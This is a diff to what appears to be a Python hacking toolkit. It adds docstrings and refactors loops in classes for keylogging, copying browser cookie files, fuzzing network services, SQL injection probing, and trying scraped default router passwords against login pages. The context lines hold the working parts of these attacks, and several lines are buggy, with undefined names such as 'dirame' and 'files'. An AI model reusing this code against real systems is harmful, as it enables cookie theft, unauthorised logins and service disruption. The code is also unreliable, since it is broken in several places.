@@ -13,6 +13,7 @@ class ArgParser(ArgumentParser):
     def add_option(self, arg, optional_arg, descr=''):
         self.add_argument(arg, optional_arg, help=descr)
 
+    '''parses arguments'''
     def parse(self):
         return self.parse_args()
 
@@ -32,12 +33,13 @@ class Seeker(object):
         if error:
             print(error)
 
+    '''searches for files using a path and file name'''
     def search_file(self, filename, path):
         for path, directories, files in os.walk(path):
-            for file in files:
-                if filename.lower() in file.lower():
-                    print(os.path.join(path, file))
-                    self.count.append(file)
+            for Filename in files:
+                if filename.lower() in Filename.lower():
+                    print(os.path.join(path, Filename))
+                    self.count.append(Filename)
 
 
 class System(object):
@@ -55,6 +57,8 @@ class System(object):
         if error:
             print(error)
 
+    ''' returns the platform the archiecture
+            hostname and processor of the system'''
     def get(self):
         return self.platform, self.architecture, self.hostname, self.processor
 
@@ -71,6 +75,8 @@ class Ip(object):
         if error:
             print(error)
 
+    '''requests a page and uses regular expressions to extract the Ip
+        and returns the value'''
     def get(self):
         request = requests.get(self.url)
         ip = re.findall("\d{1,3}\.\d{1,3}\.\d{1,3}.\d{1,3}", request.text)[0]
@@ -135,6 +141,7 @@ class Keylogger(object):
         if error:
             print(error)
 
+    '''creates a file and writes the source code'''
     def save(self, filename):
         with open(filename, 'w') as source:
             source.write(self.code)
@@ -158,6 +165,7 @@ class Scrape(object):
         if error:
             print(error)
 
+    '''within finding all "a" tags prints the reference links'''
     def scrape(self):
         for link in self.href_parser.findAll("a"):
             print(link.get("href"))
@@ -182,10 +190,9 @@ class Cookiemonster(object):
 
     def __len__(self):
         for paths in self.cookie_paths:
-            continue
-        for file in os.listdir(paths):
             try:
-                self.files.append(os.path.join(paths, file))
+                for filename in os.listdir(paths):
+                    self.files.append(os.path.join(paths, filename))
             except Exception as e:
                 pass
         return len(files)
@@ -197,25 +204,26 @@ class Cookiemonster(object):
         if error:
             print(error)
 
+    '''attempts to display all cookies'''
     def show(self):
         for paths in self.cookie_paths:
-            continue
-            for file in os.listdir(paths):
-                try:
-                    print(os.path.join(paths, file))
-                except Exception as e:
-                    pass
+            try:
+                for filename in os.listdir(paths):
+                    print(os.path.join(paths, filename))
+            except Exception as e:
+                pass
 
+    '''save cookies to a directory using a path'''
     def save(self, path, dir_name):
         cookie_jar = os.path.join(path, dir_name)
         if not os.path.exists(cookie_jar):
             os.mkdir(dirame)
             for paths in self.cookie_paths:
-                for file in os.listdir(paths):
-                    try:
-                        copy(os.path.join(paths, file), cookie_jar)
-                    except Exception as e:
-                        pass
+                try:
+                    for filename in os.listdir(paths):
+                        copy(os.path.join(paths, filename), cookie_jar)
+                except Exception as e:
+                    pass
 
 
 class NetFuzzer(object):
@@ -235,10 +243,12 @@ class NetFuzzer(object):
         if error:
             print(error)
 
+    '''creates a buffer'''
     def buildbuffer(self, chars, length):
         self.buffer = chars * length
         return self.buffer
 
+    '''fuzzez the target'''
     def fuzz(self):
         self.sock.settimeout(10)
         self.sock.connect((self.host, self.port))
@@ -247,6 +257,7 @@ class NetFuzzer(object):
         self.sock.recv(recvsize)
         return self.sock.recv(4096)
 
+    '''checks if service is still running'''
     def status(self):
         service = socket()
         service.settimeout(10)
@@ -272,6 +283,7 @@ class SQLInject(object):
         if error:
             print(error)
 
+    ''' inject in url '''
     def urlinject(self, injection):
         page = requests.get(self.url + injection)
         errors = re.findall('You have an error in your SQL syntax;',
@@ -282,9 +294,11 @@ class SQLInject(object):
                 return True
         return False
 
+    '''sql inject into a form'''
     def forminject(self, injection):
         page = request.post(self.url, data=injection)
         return page.content()
+
 
 class RouterDAuth(object):
     '''Router Default Authentication Check'''
@@ -303,6 +317,8 @@ class RouterDAuth(object):
         if error:
             print(error)
 
+    '''fetches passwords given router manufacture name from
+        http://www.routerpasswords.com/'''
     def getpasswords(self, router_name):
         payload = {"findpass": "1",
                     "router": router_name,
@@ -316,10 +332,12 @@ class RouterDAuth(object):
             self.usernames.append(table_data[3].text)
             self.passwords.append(table_data[4].text)
 
+    '''set target using url'''
     def target(self, login_page):
         self.login_page = login_page
         return login_page
 
+    '''checks router Authentication using default credentials'''
     def check(self, usernames, passwords):
         for username in usernames:
             for password in passwords:
